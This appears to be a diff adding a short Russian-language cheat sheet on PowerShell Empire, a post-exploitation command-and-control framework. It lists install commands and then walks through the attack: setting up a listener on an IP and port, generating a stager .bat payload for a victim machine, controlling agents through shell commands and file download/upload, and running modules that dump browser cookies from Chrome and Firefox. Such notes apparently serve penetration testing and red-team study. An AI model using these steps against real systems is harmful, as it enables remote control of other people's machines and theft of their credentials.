@@ -1,0 +1,78 @@
+=== Powershell-Empire
+Фреймворк для пост-эксплуатации
+Хакер №5 май 2020 24 стр
+
+git clone https://github.com/BC‐SECURITY/Empire.git
+cd Empire
+sudo ./setup/install.sh
+
+Работаем через докер:
+docker run -it -p 8080:8080 bcsecurity/empire:v3.0.7
+
+# with persistent storage
+docker pull bcsecurity/empire:{version}
+docker create -v /empire --name data bcsecurity/empire:{version}
+docker run -it --volumes-from data bcsecurity/empire:{version}
+
+# if you prefer to be dropped into bash instead of directly into empire
+docker run -it --volumes-from data bcsecurity/empire:{version} /bin/bash
+
+
+listeners - что крутится на сервере
+stager - генерация с полезной нагрузкой
+agent - клиент на машине
+module - код запускаемый агентом под задачу
+
+
+== Эксплуатация
+Просмотр доступных листнеров
+uselistener <tab> 
+info
+
+Задаем параметры:
+set Name l1
+set Host http://192.168.6.1
+set Port 4321
+
+Запустить сервер
+execute
+
+Посмотреть запущенные:
+listeners
+
+Внести изменения и применить
+edit http Port 8080
+disable/enable http
+
+
+Доступные стейджи
+usestager <tab> 
+	info
+Задаем имя листнера и генерируем код
+set Listener l1
+set OutFile /home/ralf/tmp/l1.bat
+execute
+
+После запуска скрипта на машине появляется сообщение на консоли
+
+
+== agent
+Список доступных агентов
+agents
+
+Перейти к управлению 
+interact J5VSFH61
+
+
+sysinfo
+shell whoami
+download/upload - позволяет загрузить, или выгрузить файл
+sleep 60 - принимать команду раз в минуту
+
+
+
+== Модули
+Достать куки из браузеров:
+collection/ChromeDump;
+collection/FoxDump;
+collection/SharpChromium.
